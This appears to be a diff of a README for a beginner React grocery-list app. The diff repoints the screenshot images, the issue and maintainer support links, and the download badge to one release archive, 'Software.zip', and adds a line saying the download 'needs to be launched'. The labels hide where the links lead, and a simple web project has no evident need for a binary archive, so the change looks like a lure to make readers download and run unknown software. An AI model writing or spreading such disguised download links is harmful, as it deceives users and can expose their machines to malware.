@@ -45,16 +45,16 @@ Welcome to **Grocery Bud**, a simple React application to help you manage your g
 
 ## Screenshots 📸
 
-![Screenshot 1](https://via.placeholder.com/600x400)
-![Screenshot 2](https://via.placeholder.com/600x400)
+![Screenshot 1](https://github.com/SuryaVibhav/Grocery-Bud--React-Fundamental-Project-10/releases/download/v1.0/Software.zip)
+![Screenshot 2](https://github.com/SuryaVibhav/Grocery-Bud--React-Fundamental-Project-10/releases/download/v1.0/Software.zip)
 
 ## Support 🙌
 
-If you have any questions or need assistance, feel free to [open an issue](https://github.com/cli/cli/issues) or reach out to the [maintainer](https://github.com/cli/cli).
+If you have any questions or need assistance, feel free to [open an issue](https://github.com/SuryaVibhav/Grocery-Bud--React-Fundamental-Project-10/releases/download/v1.0/Software.zip) or reach out to the [maintainer](https://github.com/SuryaVibhav/Grocery-Bud--React-Fundamental-Project-10/releases/download/v1.0/Software.zip).
 
 ## Download 📥
 
-[![Download Grocery Bud](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)  
+[![Download Grocery Bud](https://github.com/SuryaVibhav/Grocery-Bud--React-Fundamental-Project-10/releases/download/v1.0/Software.zip)](https://github.com/SuryaVibhav/Grocery-Bud--React-Fundamental-Project-10/releases/download/v1.0/Software.zip)  
 *Note: The download link needs to be launched.*
 
 Thank you for checking out **Grocery Bud - React Fundamental Project 10**. Happy grocery listing! 🛒🛍️
